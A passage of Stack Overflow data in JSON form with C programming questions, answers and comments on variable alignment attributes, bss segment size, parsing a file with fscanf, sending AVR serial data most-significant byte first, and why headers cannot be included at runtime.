probably never need it."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "edited": false, "score": 0, "creation_date": 1498028406, "post_id": 44668213, "comment_id": 76322450, "body": "The same thing as _Alignof."}], "answers": [{"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498028385, "post_id": 44668796, "comment_id": 76322436, "body": "This actually seems to reference the material the OP said he didn&#39;t understand."}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1498029057, "post_id": 44668796, "comment_id": 76322834, "body": "@JonathanLeffler: You&#39;re right, I didn&#39;t saw his link... But I added a little calculation example that explains his results."}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499593143, "post_id": 44668796, "comment_id": 76963992, "body": "@KansaiRobot: Does this answer helped you or is here no answer that meets your requirements."}], "tags": [], "owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "is_accepted": false, "score": 4, "last_activity_date": 1498072263, "last_edit_date": 1498072263, "creation_date": 1498028067, "answer_id": 44668796, "question_id": 44668213, "link": "https://stackoverflow.com/questions/44668213/attributealigned-test-what-does-it-do/44668796#44668796", "title": "__attribute(aligned) test. What does it do?", "body": "<p>The alignment attribute is described <a href=\"https://gcc.gnu.org/onlinedocs/gcc-3.3.2/gcc/Variable-Attributes.html\" rel=\"nofollow noreferrer\">here in the GNU Compiler documentation</a>.</p>\n\n<p>It said about it:</p>\n\n<blockquote>\n  <p>This attribute specifies a minimum alignment for the variable or structure field, measured in bytes.</p>\n</blockquote>\n\n<p>That means you will set the minimum alignment but for the <strong>beginning of the array</strong>. The rest of the array is guaranteed to be contiguous, that means the addresses that follows are dependent on the type in your example <code>uint8_t</code>. If the array start address is at <code>0x2aff9175b0a0</code> like in your case the next address must be 1 byte after it at <code>0x2aff9175b0a1</code> (<code>0xa0 --&gt; 0xa1</code>).</p>\n\n<p>To explain your example:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Alignment 32 beginning at: 0x2aff9175b0a0 --&gt; 0xa0 = 160 = 32 * 5\nAlignment 8  beginning at: 0x2aff9175b080 --&gt; 0x80 = 128 = 8  * 16\nAlignment 8  beginning at: 0x2aff9175b068 --&gt; 0x68 = 104 = 8  * 13\nAlignment 32 beginning at: 0x2aff9175b040 --&gt; 0x40 = 64  = 32 * 2\n</code></pre>\n\n<p>As you see the alignment of the beginning of the array is as you want it. You could increase the alignment and watch the addresses again. But also consider:</p>\n\n<blockquote>\n  <p>Note that the effectiveness of aligned attributes may be limited by inherent limitations in your linker. On many systems, the linker is only able to arrange for variables to be aligned up to a certain maximum alignment.</p>\n</blockquote>\n\n<p>Further if you use <code>printf()</code> to print the addresses with <code>%p</code>, then also cast the addresses to a <code>void*</code>, because the pointer types doesn't need to have the same representations except for some of them. That fact is also <a href=\"https://stackoverflow.com/a/24867946/8051589\">explained here</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 2, "last_activity_date": 1498029380, "creation_date": 1498029380, "answer_id": 44669222, "question_id": 44668213, "link": "https://stackoverflow.com/questions/44668213/attributealigned-test-what-does-it-do/44669222#44669222", "title": "__attribute(aligned) test. What does it do?", "body": "<p>You might get a better picture of what's going on with slightly different sample code.  Here's an adaptation of your program.  There's no virtue in printing the addresses of elements indexed by <code>[1]</code> etc; those positions are 100% controlled by the type (<code>uint8_t</code>) and the start address of the array.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt; \n\nuint8_t Array1[5]__attribute((aligned(32)));\nuint8_t Array2[5]__attribute((aligned(8)));\nstatic uint8_t Array3[5]__attribute((aligned(8)));\nstatic uint8_t Array4[5]__attribute((aligned(32)));\n\nuint16_t u16_a1[3];\nuint16_t u16_a2[3];\nuint16_t u16_a3[3];\n\nuint16_t u16_a4[3] __attribute((aligned(32)));\nuint16_t u16_a5[3] __attribute((aligned(32)));\nuint16_t u16_a6[3] __attribute((aligned(32)));\n\nint main(void)\n{\n    printf(\"%s: %p\\n\", \"Array1\", (void *)Array1);\n    printf(\"%s: %p\\n\", \"Array2\", (void *)Array2);\n    printf(\"%s: %p\\n\", \"Array3\", (void *)Array3);\n    printf(\"%s: %p\\n\", \"Array4\", (void *)Array4);\n\n    printf(\"%s: %p\\n\", \"u16_a1\", (void *)u16_a1);\n    printf(\"%s: %p\\n\", \"u16_a2\", (void *)u16_a2);\n    printf(\"%s: %p\\n\", \"u16_a3\", (void *)u16_a3);\n    printf(\"%s: %p\\n\", \"u16_a4\", (void *)u16_a4);\n    printf(\"%s: %p\\n\", \"u16_a5\", (void *)u16_a5);\n    printf(\"%s: %p\\n\", \"u16_a6\", (void *)u16_a6);\n\n    return 0;\n}\n</code></pre>\n\n<p>I had to remove the <code>section(bbs),</code> directive; the Mac linker didn't accept it.  I also renamed <code>Array</code> to <code>Array1</code> for self-consistency with the rest of the array names.</p>\n\n<p>The output I got was:</p>\n\n<pre><code>Array1: 0x10a1fc040\nArray2: 0x10a1fc048\nArray3: 0x10a1fc028\nArray4: 0x10a1fc020\nu16_a1: 0x10a1fc04e\nu16_a2: 0x10a1fc054\nu16_a3: 0x10a1fc05a\nu16_a4: 0x10a1fc060\nu16_a5: 0x10a1fc080\nu16_a6: 0x10a1fc0a0\n</code></pre>\n\n<p>Note that the address of <code>Array1</code> is aligned on a 32-byte boundary, and <code>Array2</code> is on an 8 byte boundary just after <code>Array1</code>.  Similarly, <code>Array3</code> and <code>Array4</code> are located on appropriately aligned boundaries.  (Of course, a 32-byte boundary is an address which ends <code>z0</code> in hex, where <code>z</code> is an even number.  An 8-byte boundary is an address that ends in <code>8</code> or <code>0</code> in hex.)</p>\n\n<p>The <code>u16_a1</code> to <code>u16_a3</code> arrays are not alignment constrained.  They're 6 bytes each, and the three addresses differ by 6 bytes.</p>\n\n<p>By contrast, the <code>u16_a4</code> to <code>u16_a6</code> arrays are constrained to a 32-byte boundary.  As you can see, their addresses differ from each other by 32 bytes, and each is located on a 32-bit boundary, whereas if they were unconstrained, they'd be much closer together.  You might note that <code>u16_a3</code> and <code>u16_a4</code> happen to be contiguous in memory \u2014 pure chance, not planning on my part.</p>\n\n<p>You can adapt this code to play with other types and alignments.</p>\n"}], "owner": {"reputation": 3818, "user_id": 4451521, "user_type": "registered", "accept_rate": 34, "profile_image": "https://www.gravatar.com/avatar/4b19b54142d820aad565ca95f920c11c?s=128&d=identicon&r=PG", "display_name": "KansaiRobot", "link": "https://stackoverflow.com/users/4451521/kansairobot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1498072263, "creation_date": 1498026043, "last_edit_date": 1498028292, "question_id": 44668213, "link": "https://stackoverflow.com/questions/44668213/attributealigned-test-what-does-it-do", "title": "__attribute(aligned) test. What does it do?", "body": "<p>I am using a couple of online compilers to test a sample program (for reference, the one in ideone and the one in tutorialspoint) \nThe program is:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt; \n\nuint8_t Array[5]__attribute((aligned(32)));\nuint8_t Array2[5]__attribute((aligned(8)));\nstatic uint8_t Array3[5]__attribute((aligned(8)));\nstatic uint8_t Array4[5]__attribute((section(\"bbs\"),aligned(32)));\n\n\nint main()\n{\n    printf(\"%p %p %p %p %p \\n\", &amp;Array[0], &amp;Array[1], &amp;Array[2], &amp;Array[3],&amp;Array[4]);\n    printf(\"%p %p %p %p %p \\n\", &amp;Array2[0], &amp;Array2[1], &amp;Array2[2], &amp;Array2[3],&amp;Array2[4]);\n    printf(\"%p %p %p %p %p \\n\", &amp;Array3[0], &amp;Array3[1], &amp;Array3[2], &amp;Array3[3],&amp;Array3[4]);\n    printf(\"%p %p %p %p %p \\n\", &amp;Array4[0], &amp;Array4[1], &amp;Array4[2], &amp;Array4[3],&amp;Array4[4]);\n\n    return 0;\n}\n</code></pre>\n\n<p>The results are for example</p>\n\n<pre><code>0x2aff9175b0a0 0x2aff9175b0a1 0x2aff9175b0a2 0x2aff9175b0a3 0x2aff9175b0a4 \n0x2aff9175b080 0x2aff9175b081 0x2aff9175b082 0x2aff9175b083 0x2aff9175b084 \n0x2aff9175b068 0x2aff9175b069 0x2aff9175b06a 0x2aff9175b06b 0x2aff9175b06c \n0x2aff9175b040 0x2aff9175b041 0x2aff9175b042 0x2aff9175b043 0x2aff9175b044 \n</code></pre>\n\n<p>I can see that aligned does not seem to have an effect on where the array elements are stored. What does aligned actually do? (I am asking <em>after</em> reading the explanation in <a href=\"https://gcc.gnu.org/onlinedocs/gcc-3.2/gcc/Type-Attributes.html\" rel=\"nofollow noreferrer\">here</a> which I didn't quite catch.)</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 1, "last_activity_date": 1498025405, "creation_date": 1498025405, "answer_id": 44668060, "question_id": 44667934, "link": "https://stackoverflow.com/questions/44667934/why-bss-has-some-value-in-this-case/44668060#44668060", "title": "Why bss has some value in this case?", "body": "<p>You are looking at the segment sizes for the full executable program: the object module for your source code is linked to the standard library startup code and the necessary library support functions, such as <code>exit</code>.  The numbers you see for <code>data</code> and <code>bss</code> are probably due to global objects defined by these modules.  Note in particular that your <code>main</code> function hardly justifies 960 bytes of code.</p>\n\n<p>Generate just an object file and run <code>size</code> on that:</p>\n\n<pre><code>$ gcc -c memory-layout.c\n$ size memory-layout.o\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 8192201, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bdfe8330a2e0cdaa2d11d7bdfbb7a6ca?s=128&d=identicon&r=PG&f=1", "display_name": "Mbeginner", "link": "https://stackoverflow.com/users/8192201/mbeginner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "closed_date": 1498034349, "accepted_answer_id": 44668060, "answer_count": 1, "score": 2, "last_activity_date": 1498025405, "creation_date": 1498024879, "question_id": 44667934, "link": "https://stackoverflow.com/questions/44667934/why-bss-has-some-value-in-this-case", "closed_reason": "Duplicate", "title": "Why bss has some value in this case?", "body": "<p>I saw this in some website and was surprised with the result:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    return 0;\n}\n</code></pre>\n\n<p>When the above code is checked for memory in each sections using <code>size</code></p>\n\n<pre><code>$ gcc memory-layout.c -o memory-layout\n$ size memory-layout\ntext       data        bss        dec        hex    filename\n960        248          8       1216        4c0    memory-layout\n</code></pre>\n\n<p>Here,\n    without any global or static variables, the size of <code>bss</code> is shown <code>8</code>. I didn't get for what this 8 bytes are used?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1498023018, "post_id": 44667456, "comment_id": 76319910, "body": "Very often, using <code>scanf()</code> and then saying &quot;reading lines&quot; are best handled by saying &quot;use <code>fgets()</code> and <code>sscanf()</code>&quot;, and not using <code>scanf()</code> directly."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498023076, "post_id": 44667456, "comment_id": 76319932, "body": "Note that the old C standard (C99; as opposed to the archaic C90 standard, or the current C11 standard) requires you to specify a return type for every function, including <code>main()</code>."}, {"owner": {"reputation": 1771, "user_id": 5644874, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/AlXxH.jpg?s=128&g=1", "display_name": "Seek Addo", "link": "https://stackoverflow.com/users/5644874/seek-addo"}, "edited": false, "score": 1, "creation_date": 1498023251, "post_id": 44667456, "comment_id": 76320001, "body": "check the return value of <code>fpoen</code> before using it"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user8177431"}, "edited": false, "score": 0, "creation_date": 1498027017, "post_id": 44668374, "comment_id": 76321646, "body": "I would like the &quot;searching&quot; to &quot;stop&quot; once a match is found. I hope the answer I choose above does that. such fear came to my mind after I noticed the <b>%d matches</b> in your code."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8177431"}, "edited": false, "score": 0, "creation_date": 1498027434, "post_id": 44668374, "comment_id": 76321896, "body": "it is probably true : <b>if (id == 3)</b> is much better than <b>strcmp</b>. this portion I will copy for sure."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498027440, "post_id": 44668374, "comment_id": 76321899, "body": "@UnreasonableDirection: I updated the answer for your goal.  What to do upon match is a specification issue, multiple possibilities but no fear -;)  The answer above does that, but it has a few shortcomings, such as running an infinite loop on unexpected input: try this simple contents for <code>&#47;file.txt</code>: <code>1</code>"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498027499, "post_id": 44668374, "comment_id": 76321936, "body": "I listed many problems, read and try to understand each one and how it is addressed in the code posted. It is OK to copy code as long as you understand what it does and keep the whole program consistent, otherwise it will most likely fail, especially in C."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8177431"}, "edited": false, "score": 0, "creation_date": 1498028442, "post_id": 44668374, "comment_id": 76322465, "body": "i switched the answer to this because this one has 2 specialties. ability to not even bother using strcmp and also ability to break (stop seeking) after the first match. ( I am not certain if the previously chosen answer had the ability to stop after the first match )"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498028530, "post_id": 44668374, "comment_id": 76322515, "body": "@UnreasonableDirection: you cannot keep track of lines with <code>fscanf()</code>.  When given <code>%d %99s</code> as a conversion specification, <code>fscanf()</code> will attempt to read a integer followed by a word. If it succeeds, it will return 2, if only an integer is present, it will return 1, if a non integer is present first, it will return 0, and it will return <code>EOF</code> only if nothing can be read from the stream because it is at end of file or an error occurred."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498028653, "post_id": 44668374, "comment_id": 76322588, "body": "If you want to keep track of line numbers, you must read lines with <code>fgets()</code> and parse them with <code>sscanf()</code>.  It is a much safer approach and allows better error detection and handling."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 0, "last_activity_date": 1498027113, "last_edit_date": 1498027113, "creation_date": 1498026649, "answer_id": 44668374, "question_id": 44667456, "link": "https://stackoverflow.com/questions/44667456/fscanf-strcmp-from-file-print-name-for-corresponding-id/44668374#44668374", "title": "fscanf - strcmp - from file - print name for corresponding id", "body": "<p>Your code has multiple problems:</p>\n\n<ul>\n<li>You should use a local array to read the string instead of an uninitialized pointer.</li>\n<li>You should use the type <code>int</code> for <code>id</code> as they seem to be whole numbers with a reasonably small range.</li>\n<li>You should check if <code>fopen()</code> succeeded at opening the file.</li>\n<li>You should pass the maximum number of chars to store into the <code>name</code> array to avoid a potential buffer overflow.</li>\n<li>The proper check for <code>fscanf()</code> success is comparing its return value to the number of expected conversions.</li>\n<li>You should compare numbers with the <code>==</code> operator, <code>strcmp</code> is for C strings.</li>\n<li>You should close the file.</li>\n<li>You should define <code>main()</code> as returning an <code>int</code> and return <code>0</code> upon successful operation.</li>\n<li>Keeping track of line numbers with <code>fscanf()</code> is impossible: this function treats newlines and white space indifferently and ignores it before numbers and strings.</li>\n<li>If you want to stop when a match is found, use the <code>break</code> statement.</li>\n</ul>\n\n<p>Here is a modified version:</p>\n\n<pre><code>#include &lt;errno.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {\n    char name[100];    \n    FILE *fff;\n    int found = 0;\n    int id;\n\n    fff = fopen(\"/file.txt\", \"r\");\n    if (fff == NULL) {\n        fprintf(stderr, \"cannot open input file /file.txt: %s\\n\",\n                strerror(errno));\n        return 1;\n    }\n    while (fscanf(fff, \"%d %99s\", &amp;id, name) == 2) {\n        if (id == 3) {\n            printf(\"%s\\n\", name);\n            found = 1;\n            break;\n        }\n    }\n    /* you could do something with the found indicator */\n    //if (found == 0) printf(\"no match for id == 3\\n\");\n\n    fclose(fff);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8177431"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "closed_date": 1498035385, "accepted_answer_id": 44668374, "answer_count": 1, "score": 0, "last_activity_date": 1498027113, "creation_date": 1498022835, "last_edit_date": 1498024708, "question_id": 44667456, "link": "https://stackoverflow.com/questions/44667456/fscanf-strcmp-from-file-print-name-for-corresponding-id", "closed_reason": "Needs details or clarity", "title": "fscanf - strcmp - from file - print name for corresponding id", "body": "<p><strong>WARNING:</strong> code is completely non functional. probably has many mistakes. </p>\n\n<p><strong>intent:</strong> print name for the id from database: <strong>file.txt</strong></p>\n\n<p>file.txt  ( id, name )</p>\n\n<pre><code>1 ooo\n2 eee\n3 zzz\n</code></pre>\n\n<p>test.c : ( just a sketch. <strong>does not work</strong> ).</p>\n\n<p>Although the script below does not work. my intent is to make it work as is. and not use some other method. because I have a feeling this would be a very logical method with very little lines of code. in the example below I TRIED to get the name for <strong>id 3</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nmain()\n{\n\n    FILE *fff;\n    fff = fopen(\"/file.txt\",\"r\");\n    char *name;\n\n    int r, line = 0, found = 0;\n    float id;\n\n    r = fscanf(fff, \"%f %s\\n\", &amp;id, name);\n\n    while (r != EOF){\n        line++;\n\n        if(strcmp(\"3\", id) == 0){\n            printf(\"%s\",name);\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "avr", "arduino-uno"], "comments": [{"owner": {"reputation": 6233, "user_id": 5741073, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/1uZeL.jpg?s=128&g=1", "display_name": "TomServo", "link": "https://stackoverflow.com/users/5741073/tomservo"}, "edited": false, "score": 0, "creation_date": 1498078748, "post_id": 44667439, "comment_id": 76356418, "body": "Are you saying your bits on individual bytes need to be reversed?  Like <code>0b00110001</code> becoming <code>0b10001100</code>?  Or are you saying you want the two bytes of an integer (16-bits on Arduino) to be transmitted most-significant byte first?"}, {"owner": {"reputation": 41, "user_id": 6388996, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/10204618752868609/picture?type=large", "display_name": "Saad Anwar", "link": "https://stackoverflow.com/users/6388996/saad-anwar"}, "reply_to_user": {"reputation": 6233, "user_id": 5741073, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/1uZeL.jpg?s=128&g=1", "display_name": "TomServo", "link": "https://stackoverflow.com/users/5741073/tomservo"}, "edited": false, "score": 0, "creation_date": 1498098820, "post_id": 44667439, "comment_id": 76362091, "body": "@JLH the MSB byte to be transmitted first."}, {"owner": {"reputation": 6233, "user_id": 5741073, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/1uZeL.jpg?s=128&g=1", "display_name": "TomServo", "link": "https://stackoverflow.com/users/5741073/tomservo"}, "edited": false, "score": 0, "creation_date": 1498234100, "post_id": 44667439, "comment_id": 76433871, "body": "Understood.  My answer allows you to separate the bytes of an int (16-bit on Arduino) and send them in the order you prefer."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498388235, "post_id": 44697539, "comment_id": 76472168, "body": "Note that according to the C Standard, if <code>value</code> is negative, <code>value &gt;&gt; 8</code> has undefined behavior. You can work around this problem with <code>unsigned char MSB = ((unsigned)value &gt;&gt; 8);</code>"}], "tags": [], "owner": {"reputation": 6233, "user_id": 5741073, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/1uZeL.jpg?s=128&g=1", "display_name": "TomServo", "link": "https://stackoverflow.com/users/5741073/tomservo"}, "is_accepted": true, "score": 1, "last_activity_date": 1498129465, "creation_date": 1498129465, "answer_id": 44697539, "question_id": 44667439, "link": "https://stackoverflow.com/questions/44667439/how-to-change-endian-ness-of-data-being-transmitted-serially/44697539#44697539", "title": "How to change endian-ness of data being transmitted serially?", "body": "<p>To separate the int (16 bits on Arduino) into MSB and LSB, you need something like this:</p>\n\n<pre><code>int value; // Arduino int is 16 bits\nunsigned char MSB = (value &gt;&gt; 8);  \nunsigned char LSB = (value &amp; 0xFF);\n</code></pre>\n\n<p>Now that you have two 8-bit values you can send them in the order you need to.</p>\n"}], "owner": {"reputation": 41, "user_id": 6388996, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/10204618752868609/picture?type=large", "display_name": "Saad Anwar", "link": "https://stackoverflow.com/users/6388996/saad-anwar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "accepted_answer_id": 44697539, "answer_count": 1, "score": 0, "last_activity_date": 1498361119, "creation_date": 1498022707, "last_edit_date": 1498361119, "question_id": 44667439, "link": "https://stackoverflow.com/questions/44667439/how-to-change-endian-ness-of-data-being-transmitted-serially", "title": "How to change endian-ness of data being transmitted serially?", "body": "<p>I am trying to send a data serially and since I extract the first digit first i.e. LSB and it is the first char being transmitted, the data becomes totally inverted. Thus first I am inverting the data inside the avr and then transmitting it serially, but when I do that I get whole lot of garbage values. I cannot understand how I can transmit the data in a way that my MSB reaches first and then the LSB. I have written a simpler code for you all guys to look at. Please tell me where I am going wrong.</p>\n\n<pre><code>#include &lt;avr/io.h&gt;\n#define F_CPU 16000000UL\nvolatile int val=0,temp=0,y=0,rev=0,y1;\nchar c;\n\nvoid byte_init (int baud)\n{\n    UBRR0H = (baud&gt;&gt;8);                      // shift the register right by 8 bits\n    UBRR0L = baud;                           // set baud rate\n    UCSR0B|= (1&lt;&lt;TXEN0)|(1&lt;&lt;RXEN0);                // enable receiver and transmitter\n    UCSR0C|= (1&lt;&lt;UCSZ00)|(1&lt;&lt;UCSZ01);   // 8bit data format\n}\n\nvoid byte_transmit (unsigned char data)\n{\n    while (!( UCSR0A &amp; (1&lt;&lt;UDRE0)));                // wait while register is free\n    UDR0 = data;                                   // load data in the register\n}\n\nunsigned char byte_receive (void)\n{\n    while(!(UCSR0A) &amp; (1&lt;&lt;RXC0));                   // wait while data is being received\n    return UDR0;                                   // return 8-bit data\n}\n\nvoid setup() {\n    // put your setup code here, to run once:\n    byte_init(103);\n    pinMode(13,OUTPUT);\n}\n\nvoid loop() {\n    // put your main code here, to run repeatedly:\n    digitalWrite(13,HIGH);\n    digitalWrite(13,LOW);\n    //it can send integer directly\n    temp=val;\n    while(temp&gt;0)\n    {\n        y1=temp%10;\n        rev=rev*10+val;\n        temp=temp/10;\n    }\n    while(rev&gt;0)\n    {\n        y=rev%10;\n        c=y+'0';\n        byte_transmit(c);\n        rev=rev/10;\n    }\n    byte_transmit('A');\n    val++;\n    delay(1000);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 23069, "user_id": 156811, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/380335e95e6be9740e56b64d667279b3?s=128&d=identicon&r=PG", "display_name": "Havenard", "link": "https://stackoverflow.com/users/156811/havenard"}, "edited": false, "score": 4, "creation_date": 1498022819, "post_id": 44667436, "comment_id": 76319844, "body": "Inclusions are resolved in pre-compilation, not at run time... you can&#39;t change the program after it&#39;s been compiled."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1498023043, "post_id": 44667436, "comment_id": 76319919, "body": "Welcome to StackOverflow. Are you sure you mean &quot;include&quot;? If you want to read that header/textfile and process it with your program instead, there are ways to do that. You will probably need to use `fopen()&quot; and functions in the vicinity of &quot;fscanf()&quot;. Search online for those terms and find a tutorial."}], "answers": [{"comments": [{"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1498024213, "post_id": 44667533, "comment_id": 76320363, "body": "sorry by mistake i wrote runtime. it is compile time(preprocessing stage)."}], "tags": [], "owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "is_accepted": false, "score": 1, "last_activity_date": 1498024030, "last_edit_date": 1498024030, "creation_date": 1498023244, "answer_id": 44667533, "question_id": 44667436, "link": "https://stackoverflow.com/questions/44667436/include-a-variable-header-path-in-c/44667533#44667533", "title": "include a variable header path in C", "body": "<p>The header files are preprocessed in such a way that all the definitions are included into the file at compile time. In preprocessing all the <code>#include\" \"</code> or <code>#include&lt; &gt;</code> will be replaced by translator/ preprocessing unit of compiler.\nIf you will try to include them at runtime it will not make any sense. They are probable already removed.     </p>\n"}, {"tags": [], "owner": {"reputation": 30168, "user_id": 5612562, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/gzBQY.jpg?s=128&g=1", "display_name": "msc", "link": "https://stackoverflow.com/users/5612562/msc"}, "is_accepted": true, "score": 2, "last_activity_date": 1498024029, "last_edit_date": 1498024029, "creation_date": 1498023690, "answer_id": 44667647, "question_id": 44667436, "link": "https://stackoverflow.com/questions/44667436/include-a-variable-header-path-in-c/44667647#44667647", "title": "include a variable header path in C", "body": "<p>You cannot include any header dynamically in C language because  <code>#include</code> being evaluated during compile time only(<strong>Preprocessor directives</strong> actually happens before compilation). You need to include the header statically with <code>#include 